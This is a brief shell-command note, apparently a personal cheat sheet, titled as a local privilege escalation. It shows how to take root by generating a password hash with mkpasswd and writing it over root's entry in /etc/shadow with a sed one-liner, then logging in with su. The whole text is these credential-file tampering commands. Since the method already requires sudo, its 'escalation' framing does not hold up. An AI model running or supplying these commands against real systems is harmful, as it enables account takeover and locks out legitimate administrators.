# Hash Paws
# Getting (root) by modifying /etc/shadow - Local Privilege Escalation 

mkpasswd -m yescrypt "password123" # Boring example, but I used that.

# Put this into /etc/shadow
sudo sed -i 's|^root:[^:]*|root:$y$j9T$30Y5XDeswiBjb8xsY8DSU0$ywsipBozEEesKTsy.miPdN2SYhS1qidXHLbHruimFK8|' /etc/shadow

# Log in, use your string
su root

# New password help
sudo passwd root
